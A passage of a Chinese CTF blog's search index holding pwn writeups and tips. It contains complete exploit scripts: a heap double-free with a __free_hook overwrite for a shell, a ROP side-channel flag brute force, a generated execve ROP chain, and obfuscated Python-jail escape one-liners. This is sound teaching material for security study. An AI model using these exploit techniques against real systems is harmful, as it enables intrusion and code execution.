main_arena = 0x3dac20 main_off = 1002 libc_base = u64(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) - (main_arena + 1002) system_addr = libc_base + libc.sym[\u0026#39;system\u0026#39;] p.sendlineafter(\u0026#34;Let\u0026#39;s make a test.\\n\u0026#34;, hex(system_addr)) step2 double free 构建循环malloc链 因为fastbin在libc2.26中对double free的检查只是单纯地检查表头的chunk是否和正在free的chunk一样，所以只要我们在double free中间随便free一个别的chunk，它就检查不到了（新版本不行）\n如果是2.27~2.28中的tcache bin就更好办了，因为其根本没有任何检查，直接free两次即可 而如果是2.29~2.31，tcache_entry增加了一个attribute，key字段，要么更改key字段然后double free，要么使用fastbin double free，详情见此文章\n大多数程序经常会申请以及释放一些比较小的内存块。如果将一些较小的 chunk 释放之后发现存在与之相邻的空闲的 chunk 并将它们进行合并，那么当下一次再次申请相应大小的 chunk 时，就需要对 chunk 进行分割，这样就大大降低了堆的利用效率。因为我们把大部分时间花在了合并、分割以及中间检查的过程中。 因此，ptmalloc 中专门设计了 fast bin，对应的变量就是 malloc state 中的 fastbinsY\n需要注意的是，能进入fastbin中的chunk会直接进入fastbin，尽管它和top chunk相邻也不会合并，见ctfwiki\ndelete(1) delete(2) delete(1) p.sendlineafter(\u0026#34;what sizes you make?\\n\u0026#34;, str(0x10)) step3 更改fd指针指向free_hook，填入危险函数地址 这时我们因为获得了一个循环的malloc链，可以无限地malloc，所以我们可以在第一次add时更改fd指针，指向free_hook，然后将其改为system的地址\n我们将\u0026quot;/bin/sh\u0026quot;存在一个chunk中，若__free_hook的值改为了system，则原本的free(\u0026quot;/bin/sh\u0026quot;)就会产生system(\u0026quot;/bin/sh\u0026quot;)的效果\nadd(3, 0x10, p64(m_elf.sym[\u0026#39;free_hook\u0026#39;])) add(4, 0x10, b\u0026#34;/bin/sh\\x00\u0026#34;) add(5, 0x10, b\u0026#34;a\u0026#34;) add(6, 0x10, p64(system_addr)) step4 getshell (fake) 这时候我们delete(4)就可以了\ndelete(4) 真实场景getshell！ 就是把上面的思路复现一遍\n不过不同的是我们不用leak libc了，因为上面我们已经获得了libc基址\n直接构建malloc链然后fastbin attack即可\n# flag设为True add(7, 0x10, b\u0026#34;\u0026#34;, True) add(8, 0x10, b\u0026#34;\u0026#34;, True) delete(7, True) delete(8, True) delete(7, True) add(9, 0x10, p64(libc.sym[\u0026#39;__free_hook\u0026#39;]+libc_base), True) add(10, 0x10, b\u0026#34;/bin/sh\\x00\u0026#34;, True) add(11, 0x10, b\u0026#34;a\u0026#34;, True) add(12, 0x10, p64(system_addr), True) delete(10, True) p.interactive() 完整exp from pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher pss: bool = False fn: str = \u0026#34;./learnheap\u0026#34; libc_name:str = \u0026#34;./libc-2.26.so\u0026#34; port: str = \u0026#34;10072\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;43.248.98.206\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) m_elf = ELF(fn) libc = ELF(libc_name) def add(index: int, size: int, content, flag: bool = False): if flag: p.clean() p.sendline(b\u0026#34;1\u0026#34;) p.clean() p.sendline(str(index)) p.clean() p.sendline(str(size)) p.clean() p.sendline(content) def delete(index: int, flag: bool = False): if flag: p.clean() p.sendline(b\u0026#34;3\u0026#34;) p.clean() p.sendline(str(index)) add(0, 1071, b\u0026#34;\u0026#34;) # 大于1072会退出，但是1033就可以进入unsorted bin add(1, 0x10, b\u0026#34;\u0026#34;) delete(0) add(2, 0x10, b\u0026#34;\u0026#34;) p.recvuntil(b\u0026#34;Your book: \\n\u0026#34;) main_arena = 0x3dac20 main_off = 1002 libc_base = u64(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) - (main_arena + 1002) system_addr = libc_base + libc.sym[\u0026#39;system\u0026#39;] p.sendlineafter(\u0026#34;Let\u0026#39;s make a test.\\n\u0026#34;, hex(system_addr)) delete(1) delete(2) delete(1) p.sendlineafter(\u0026#34;what sizes you make?\\n\u0026#34;, str(0x10)) add(3, 0x10, p64(system_addr + 0x394AE8)) add(4, 0x10, b\u0026#34;/bin/sh\\x00\u0026#34;) add(5, 0x10, b\u0026#34;a\u0026#34;) add(6, 0x10, p64(system_addr)) delete(4) add(7, 0x10, b\u0026#34;\u0026#34;, True) add(8, 0x10, b\u0026#34;\u0026#34;, True) delete(7, True) delete(8, True) delete(7, True) add(9, 0x10, p64(libc.sym[\u0026#39;__free_hook\u0026#39;]+libc_base), True) add(10, 0x10, b\u0026#34;/bin/sh\\x00\u0026#34;, True) add(11, 0x10, b\u0026#34;a\u0026#34;, True) add(12, 0x10, p64(system_addr), True) delete(10, True) p.interactive() XS Club 检查程序架构 查看ida反编译代码 主要函数： 读取字符串并在末尾置零 一个加密函数，从最后的结果（\u0026quot;ZjFhZ3tYU0NURi0yMDIyLWdvLWdvLWdvfQ==\u0026quot;）来看像是base64编码 base64解码 key = base64.b64decode(\u0026#34;ZjFhZ3tYU0NURi0yMDIyLWdvLWdvLWdvfQ==\u0026#34;) 大致思路 程序用沙箱屏蔽了execve的syscall，那么大致思路就是利用open、read的syscall读入flag\n而程序又把标准输入流和标准输出流关闭了，说明一次运行只能输入一次，而且不会有回显\n但是程序又有一个strcmp，这说明我们可以利用测信道的思路来解题\n在我们调用完strcmp后跳转到这里，如果和flag相符就ret到pause，否则就会jmp rax从而报错退出\n构建ROP chain 我们先用ropper看一下程序的gadget：\n发现并没有我们想要的可以改变rax和rdx的gadget\n如果想要改变rax，我们可以利用函数的返回值保存在rax这个特性：\nset_rax_2 = flat([ # open pop_rdi, pie_base + 0x00000000000011E7, pop_rsi_r15, pie_base + 0x00000000000015A0, 0, strcmp_plt ]) set_rax_0x22 = flat([ # pause pop_rdi, pie_base + 0x00000000000011EF, pop_rsi_r15, pie_base + 0x00000000000015A0, 0, strcmp_plt ]) 但是像read这样的函数，往往是必须设置rdx的，所以我们还需要一个改变rdx的gadget\n经过观察，我们可以利用csu中的gadget：\n我们可以先用csu1中的gadget设置寄存器，然后再跳到csu2设置rdx，然后因为csu2中有一个call qword ptr [r12+rbx*8]，我们可以将r12的值设为read的got值，rbx为0，这样就能执行read函数\n当我们执行完read函数时，因为物理相邻的缘故，我们会比较rbp和rbx的值，\n所以我们要设置rbp不等于rbx\n然后我们就进入了csu1，这里有一串的pop，加上头部的add，一共我们要设置56个字节来跳过这些指令到ret\n然后我们设置一下rdi和rsi就转到call strcmp\n最后我们再填入一个pause的syscall就可以了，如果程序没有退出就会调用pause而停掉\n但问题来了，我们要怎么将我们想要与flag比较的字符输入进来呢？\n我们可以在读入invitation code的时候将需要比较的字符输入进来：\n所以rop chain为：\n# 计算代码基址 pie_base = u64(io.recv(6).ljust(8, b\u0026#39;\\x00\u0026#39;)) - (0x561d75601161 - 0x561d75600000) # strcmp、read strcmp_plt = pie_base + elf.plt[\u0026#39;strcmp\u0026#39;] read_plt = pie_base + elf.plt[\u0026#39;read\u0026#39;] read_got = pie_base + elf.got[\u0026#39;read\u0026#39;] # 设置rdi、rsi pop_rdi = pie_base + 0x00000000000011a3 pop_rsi_r15 = pie_base + 0x00000000000011a1 # syscall;ret syscall = pie_base + 0x00000000000009f5 # 有一个gadget可以设置rdx为0xa # set_rdx_10 = pie_base + 0x00000000000009f7 # 一大堆pop，设置寄存器 csu1 = pie_base + 0x000000000000119A # 将csu中设置的寄存器的值转移到其他寄存器 csu2 = pie_base + 0x0000000000001180 # bss节开始位置 bss_start = pie_base + 0x0000000000202020 # \u0026#34;./flag\\x00\u0026#34;字符串保存的位置 flag_str_addr = pie_base + 0x000000000020207a # 尝试的字符保存的位置 try_chr_addr = pie_base + 0x000000000020207f # 读入的flag文件内容保存的位置 target_chr_addr = bss_start + 0x300 # 测试strcmp成不成功的gadget test_gadget = pie_base + 0x00000000000099b # 设置rax为2 set_rax_2 = flat([ # open pop_rdi, pie_base + 0x00000000000011E7, pop_rsi_r15, pie_base + 0x00000000000015A0, 0, strcmp_plt ]) # 设置rax为0x22 set_rax_0x22 = flat([ # pause pop_rdi, pie_base + 0x00000000000011EF, pop_rsi_r15, pie_base + 0x00000000000015A0, 0, strcmp_plt ]) # 读入解码内容、\u0026#34;./flag\\x00\u0026#34;字符串、当前尝试的字符 io.sendafter(\u0026#39; code\\n\u0026#39;, flat([base64.b64decode( \u0026#39;ZjFhZ3tYU0NURi0yMDIyLWdvLWdvLWdvfQ==\u0026#39;), \u0026#39;\\x00flag\\x00\u0026#39;, try_c])) rop_chain = flat([ # 2号syscall，打开文件 set_rax_2, pop_rdi, flag_str_addr, pop_rsi_r15, 0, 0, syscall, # 读取文件内容 csu1, 0, 1, read_got, 0, # edi target_chr_addr, # rsi flag_len + 1, # rdx csu2, \u0026#39;a\u0026#39; * 56, # 比对字符 pop_rdi, try_chr_addr, pop_rsi_r15, target_chr_addr + flag_len, # 第flag_len个字符 0, strcmp_plt, test_gadget, # pause系统调用 set_rax_0x22, syscall ]) 设置延时器，保证程序正常执行 可以使用sleep函数、recv(0.5)还有signal模块来拖时间，等待程序进一步执行\nsignal模块\ndef handler(signum, frame): raise TimeoutError() signal.signal(signal.SIGALRM, handler) signal.alarm(1) try: io.recvuntil(\u0026#39;Okay, \u0026#39;) signal.alarm(0) signal.signal(signal.SIGALRM, signal.SIG_DFL) except: signal.alarm(0) signal.signal(signal.SIGALRM, signal.SIG_DFL) io.close() return False 这个模块设置在一秒之后发送TimeoutError异常，但如果在这一秒内recv到了'Okay，'，那就取消发送，否则关闭远程/停止进程\n这段代码保证了程序在一秒内正确执行（不正确执行的都死了）\nrecv(0.5)\ntry: io.recv(timeout=0.5) io.close() return True except: io.close() return False 如果在0x5秒内程序退出了，就说明没有执行pause系统调用，所以就关闭远程/停止进程\n为第9个字符单独写rop chain 因为我们的rop chain中有一条flag_len+1，而当我们爆破第九个字符时这个值为0xa，刚好和\\n的ASCII码一样，所以会发生截断，因此0xa不能出现在rop chain中\n而我们注意到syscall的gadget后面会自动将rdx设置为0xa： 那么我们直接常规思路调用read即可，不需要用到csu：\nif flag_len == 9: rop_chain = flat([ set_rax_2, pop_rdi, flag_str_addr, pop_rsi_r15, 0, 0, syscall, pop_rdi, 0, pop_rsi_r15, target_chr_addr, 0, read_plt, pop_rdi, try_chr_addr, pop_rsi_r15, target_chr_addr + flag_len, 0, strcmp_plt, test_gadget, set_rax_0x22, syscall ]) 完整exp from pwn import * import base64 import signal context.arch = \u0026#39;amd64\u0026#39; elf = ELF(\u0026#39;club\u0026#39;) def handler(signum, frame): raise TimeoutError() def pwn(try_c, flag_len): # io = process(\u0026#39;./club\u0026#39;) # io = remote(\u0026#39;127.0.0.1\u0026#39;, 9999) io = remote(\u0026#39;43.248.98.206\u0026#39;, 10075) io.sendafter(\u0026#39; is XS-Club, your name?\\n\u0026#39;, \u0026#39;a\u0026#39;) signal.signal(signal.SIGALRM, handler) signal.alarm(1) try: io.recvuntil(\u0026#39;Okay, \u0026#39;) signal.alarm(0) signal.signal(signal.SIGALRM, signal.SIG_DFL) except: signal.alarm(0) signal.signal(signal.SIGALRM, signal.SIG_DFL) io.close() return False pie_base = u64(io.recv(6).ljust(8, b\u0026#39;\\x00\u0026#39;)) - \\ (0x561d75601161 - 0x561d75600000) strcmp_plt = pie_base + elf.plt[\u0026#39;strcmp\u0026#39;] read_plt = pie_base + elf.plt[\u0026#39;read\u0026#39;] read_got = pie_base + elf.got[\u0026#39;read\u0026#39;] pop_rdi = pie_base + 0x00000000000011a3 pop_rsi_r15 = pie_base + 0x00000000000011a1 syscall = pie_base + 0x00000000000009f5 csu1 = pie_base + 0x000000000000119A csu2 = pie_base + 0x0000000000001180 bss_start = pie_base + 0x0000000000202020 flag_str_addr = pie_base + 0x000000000020207a try_chr_addr = pie_base + 0x000000000020207f target_chr_addr = bss_start + 0x300 test_gadget = pie_base + 0x00000000000099b set_rax_2 = flat([ # open pop_rdi, pie_base + 0x00000000000011E7, pop_rsi_r15, pie_base + 0x00000000000015A0, 0, strcmp_plt ]) set_rax_0x22 = flat([ # pause pop_rdi, pie_base + 0x00000000000011EF, pop_rsi_r15, pie_base + 0x00000000000015A0, 0, strcmp_plt ]) io.sendafter(\u0026#39; code\\n\u0026#39;, flat([base64.b64decode( \u0026#39;ZjFhZ3tYU0NURi0yMDIyLWdvLWdvLWdvfQ==\u0026#39;), \u0026#39;\\x00flag\\x00\u0026#39;, try_c])) rop_chain = flat([ set_rax_2, pop_rdi, flag_str_addr, pop_rsi_r15, 0, 0, syscall, csu1, 0, 1, read_got, 0, # edi target_chr_addr, # rsi flag_len + 1, # rdx csu2, \u0026#39;a\u0026#39; * 56, pop_rdi, try_chr_addr, pop_rsi_r15, target_chr_addr + flag_len, 0, strcmp_plt, test_gadget, set_rax_0x22, syscall ]) if flag_len == 9: rop_chain = flat([ set_rax_2, pop_rdi, flag_str_addr, pop_rsi_r15, 0, 0, syscall, pop_rdi, 0, pop_rsi_r15, target_chr_addr, 0, read_plt, pop_rdi, try_chr_addr, pop_rsi_r15, target_chr_addr + flag_len, 0, strcmp_plt, test_gadget, set_rax_0x22, syscall ]) io.sendlineafter(\u0026#39; leave your phone number here\\n\u0026#39;, flat({0x28: rop_chain})) sleep(0.1) io.recvuntil(\u0026#39;~\\nNow you can join the club, go crazy!!! *\\\\(^o^)/*\\n\u0026#39;) try: io.recv(timeout=0.5) io.close() return True except: io.close() return False table = string.printable + \u0026#34;\\n\u0026#34; flag = \u0026#39;\u0026#39; t = time.time() while True: for c in table: if pwn(c, len(flag)): flag += c break if flag.endswith(\u0026#39;}\u0026#39;): success(flag) success(flat([\u0026#39;time: \u0026#39;, str(round(time.time() - t, 2)), \u0026#39;s\u0026#39;])) break else: info(flag) with open(\u0026#34;out\u0026#34;, \u0026#34;a\u0026#34;, encoding=\u0026#39;UTF-8\u0026#39;) as f: f.write(flag + \u0026#34;\\n\u0026#34;) info(flat([\u0026#39;time: \u0026#39;, str(round(time.time() - t, 2)), \u0026#39;s\u0026#39;])) sleep(0.1) ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/%E6%9A%A8%E5%8D%97%E5%A4%A7%E5%AD%A62022%E6%96%B0%E7%94%9F%E8%B5%9B%E5%88%9D%E8%B5%9B-%E9%9D%9E%E5%AE%98%E6%96%B9writeup/","section":"writeup","summary":"原题链接 EasyEasyEasy 因为读入的是一个有符号数，所以当输入-1 的时候也是合法的 而我们知道，-1%256 也是-1，而v5[-1]意为*(v5-1)，指向 v5 前面一个数","tags":["pwn"],"title":"暨南大学2022新生赛初赛 非官方WriteUp"},{"categories":["tricks"],"contents":"查看程序架构 ida伪代码 exp 这题手工构造ropchain比较困难，但是我们可以利用ropper或者ROPgadget的ropchain功能来生成：\nropper ROPgadget exp 需要注意的是，工具生成的代码和我们日常使用的代码格式和风格上都有一定差距，从struct包中导入的pack函数也会和pwntools中的pack起冲突，如果一定要使用struct的pack，就在导入pwntools后再导入struct，这样就可以覆盖掉pack\n# 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes from struct import pack pss: bool = True fn: str = \u0026#34;./rop\u0026#34; libc_name: str = \u0026#34;\u0026#34; port: str = \u0026#34;27311\u0026#34; if_32: bool = True if_debug: bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) # libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None, timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: if until is not None: p.recvuntil(flat(until)) received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) return received def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None, timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout: int = 0.05, no_show: bool = False): received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True, is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... # 需要自行设定offset offset: int = 0xC + 4 # Generated by ropper ropchain generator # # 487729c3b55aaec43deb2af4c896b16f9dbd01f7e484054d1bb7f24209e2d3ae IMAGE_BASE_0 = 0x08048000 def rebase_0(x): return pg(x + IMAGE_BASE_0) rop = b\u0026#39;\u0026#39; rop += rebase_0(0x00070016) # 0x080b8016: pop eax; ret; rop += b\u0026#39;/bin\u0026#39; rop += rebase_0(0x00026cda) # 0x0806ecda: pop edx; ret; rop += rebase_0(0x000a2060) rop += rebase_0(0x0000c66b) # 0x0805466b: mov dword ptr [edx], eax; ret; rop += rebase_0(0x00070016) # 0x080b8016: pop eax; ret; rop += b\u0026#39;/sh\\x00\u0026#39; rop += rebase_0(0x00026cda) # 0x0806ecda: pop edx; ret; rop += rebase_0(0x000a2064) rop += rebase_0(0x0000c66b) # 0x0805466b: mov dword ptr [edx], eax; ret; rop += rebase_0(0x00070016) # 0x080b8016: pop eax; ret; rop += pg(0x00000000) rop += rebase_0(0x00026cda) # 0x0806ecda: pop edx; ret; rop += rebase_0(0x000a2068) rop += rebase_0(0x0000c66b) # 0x0805466b: mov dword ptr [edx], eax; ret; rop += rebase_0(0x000001c9) # 0x080481c9: pop ebx; ret; rop += rebase_0(0x000a2060) rop += rebase_0(0x00096769) # 0x080de769: pop ecx; ret; rop += rebase_0(0x000a2068) rop += rebase_0(0x00026cda) # 0x0806ecda: pop edx; ret; rop += rebase_0(0x000a2068) rop += rebase_0(0x00070016) # 0x080b8016: pop eax; ret; rop += pg(0x0000000b) rop += rebase_0(0x00027430) # 0x0806f430: int 0x80; ret; payload = flat({offset: rop}) sendline_after_clean(payload) interactive_after_clean() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/tricks/%E4%BD%BF%E7%94%A8ropgadgetropper%E5%B7%A5%E5%85%B7%E6%9E%84%E5%BB%BAropchain/","section":"tricks","summary":"查看程序架构 ida伪代码 exp 这题手工构造ropchain比较困难，但是我们可以利用ropper或者ROPgadget的ropchain功能来生成： ropper ROPgadget exp","tags":["pwn","ROPgadget","ropper","ropchain"],"title":"使用ROPgadget、ropper工具构建ropchain"},{"categories":["tricks"],"contents":"如何查看当前系统libc版本 如何查看当前系统libc版本 查看当前系统的libc版本 查看程序当前默认使用的libc版本 查看当前系统的libc版本 strings /lib/x86_64-linux-gnu/libc.so.6 | grep \u0026#34;GNU C Library\u0026#34; 查看程序当前默认使用的libc版本 ldd -v \u0026lt;程序名\u0026gt; ","date":"2022年12月28日","permalink":"https://peterliuzhi.top/tricks/%E5%A6%82%E4%BD%95%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E7%B3%BB%E7%BB%9Flibc%E7%89%88%E6%9C%AC/","section":"tricks","summary":"如何查看当前系统libc版本 如何查看当前系统libc版本 查看当前系统的libc版本 查看程序当前默认使用的libc版本 查看当前系统的libc版本 strings /lib/x86_64-linux-gnu/libc.so.6 | grep","tags":["pwn","libc"],"title":"如何查看当前系统libc版本"},{"categories":["tricks"],"contents":"先输入空格就好了，atoi会跳过空格\n","date":"2022年12月27日","permalink":"https://peterliuzhi.top/tricks/%E7%BB%95%E8%BF%87atoi%E5%89%8D%E5%AF%B9%E9%A6%96%E5%AD%97%E7%AC%A6%E6%98%AF%E5%90%A6%E4%B8%BA%E8%B4%9F%E5%8F%B7%E7%9A%84%E6%A3%80%E6%9F%A5/","section":"tricks","summary":"先输入空格就好了，atoi会跳过空格","tags":["pwn","atoi"],"title":"绕过atoi前对首字符是否为负号的检查"},{"categories":["tricks"],"contents":"基础版 __import__(\u0026#39;os\u0026#39;).system(\u0026#39;sh\u0026#39;) 进阶版 getattr(getattr(getattr(getattr(().__class__,chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()[-4],chr(95)+chr(95)+chr(105)+chr(110)+chr(105)+chr(116)+chr(95)+chr(95)),chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95))[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(115)+chr(104)) 如果知道flag文件的名字，可以用:\nopen(chr(102)+chr(108)+chr(97)+chr(103)).read() 更多资料参见https://zhuanlan.zhihu.com/p/578986988\n","date":"2022年12月23日","permalink":"https://peterliuzhi.top/tricks/%E7%BB%95%E8%BF%87pyjail%E4%B8%80%E5%8F%A5%E8%AF%9Drce/","section":"tricks","summary":"基础版 __import__(\u0026#39;os\u0026#39;).system(\u0026#39;sh\u0026#39;) 进阶版 getattr(getattr(getattr(getattr(().__class__,chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()[-4],chr(95)+chr(95)+chr(105)+chr(110)+chr(105)+chr(116)+chr(95)+chr(95)),chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95))[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(115)+chr(104)) 如果知道flag文件的名字，可以用: open(chr(102)+chr(108)+chr(97)+chr(103)).read() 更多资料参见https://zhuanlan.zhihu.com/p/578986988","tags":["pwn","pyjail"],"title":"绕过pyjail——一句话RCE"},{"categories":null,"contents":"","date":"0001年01月01日","permalink":"https://peterliuzhi.top/archive/%E6%97%A5%E5%BF%97/","section":"archive","summary":"","tags":null,"title":""},{"categories":null,"contents":"==⚠ Switch to EXCALIDRAW VIEW in the MORE OPTIONS menu of this document. ⚠==\n%%\nDrawing {\u0026#34;type\u0026#34;:\u0026#34;excalidraw\u0026#34;,\u0026#34;version\u0026#34;:2,\u0026#34;source\u0026#34;:\u0026#34;https://excalidraw.com\u0026#34;,\u0026#34;elements\u0026#34;:[],\u0026#34;appState\u0026#34;:{\u0026#34;gridSize\u0026#34;:null,\u0026#34;viewBackgroundColor\u0026#34;:\u0026#34;#ffffff\u0026#34;}} %%\n","date":"0001年01月01日","permalink":"https://peterliuzhi.top/image/drawing-2022-10-27-16.58.09.excalidraw/","section":"image","summary":"==⚠ Switch to EXCALIDRAW VIEW in the MORE OPTIONS menu of this document. ⚠==\n%%\nDrawing {\u0026#34;type\u0026#34;:\u0026#34;excalidraw\u0026#34;,\u0026#34;version\u0026#34;:2,\u0026#34;source\u0026#34;:\u0026#34;https://excalidraw.com\u0026#34;,\u0026#34;elements\u0026#34;:[],\u0026#34;appState\u0026#34;:{\u0026#34;gridSize\u0026#34;:null,\u0026#34;viewBackgroundColor\u0026#34;:\u0026#34;#ffffff\u0026#34;}} %%","tags":["excalidraw"],"title":""},{"categories":null,"contents":"","date":"0001年01月01日","permalink":"https://peterliuzhi.top/stats/stats/","section":"stats","summary":"","tags":null,"title":""},{"categories":null,"contents":"","date":"0001年01月01日","permalink":"https://peterliuzhi.top/search.html/","section":"","summary":"","tags":null,"title":"包含关键词 的文章"}]